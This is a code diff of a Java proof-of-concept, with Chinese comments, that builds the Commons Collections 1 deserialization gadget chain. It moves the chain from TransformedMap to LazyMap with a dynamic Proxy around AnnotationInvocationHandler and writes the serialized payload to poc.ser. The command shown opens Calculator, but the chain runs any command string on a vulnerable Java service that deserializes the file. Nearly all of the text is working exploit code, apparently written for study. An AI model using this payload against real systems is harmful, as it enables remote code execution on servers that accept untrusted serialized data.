@@ -2,19 +2,17 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.map.TransformedMap;
+import org.apache.commons.collections.map.LazyMap;
 
 import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 
 import java.lang.annotation.Retention;
-import java.lang.annotation.Target;
-
-import java.lang.reflect.Constructor;
+import java.lang.reflect.*;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CommonCollections1Test3 {
+public class CommonCollections1Test4 {
     public static void main(String[] args) throws Exception {
         // 要执行的命令
         String cmd = "open -a /System/Applications/Calculator.app";
@@ -44,21 +42,21 @@ public class CommonCollections1Test3 {
 
         // 创建个 Map 准备拿来绑定 transformerChina
         Map innerMap = new HashMap();
-        // put 第一个参数必须为 value, 第二个参数随便写
-        innerMap.put("value", "xxxx");
 
         // 创建个 transformerChina 并绑定 innerMap
-        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
 
         // 反射机制调用AnnotationInvocationHandler类的构造函数
         Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
         Constructor ctor = clazz.getDeclaredConstructor(Class.class, Map.class);
-
-        // 取消构造函数修饰符限制
         ctor.setAccessible(true);
 
+        // 使用jdk动态代理
+        InvocationHandler handler = (InvocationHandler) ctor.newInstance(Retention.class, outerMap);
+        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
+
         // 获取 AnnotationInvocationHandler 类实例
-        Object instance = ctor.newInstance(Retention.class, outerMap);
+        Object instance = ctor.newInstance(Retention.class, proxyMap);
 
         // 保存反序列化文件
         FileOutputStream f = new FileOutputStream("poc.ser");
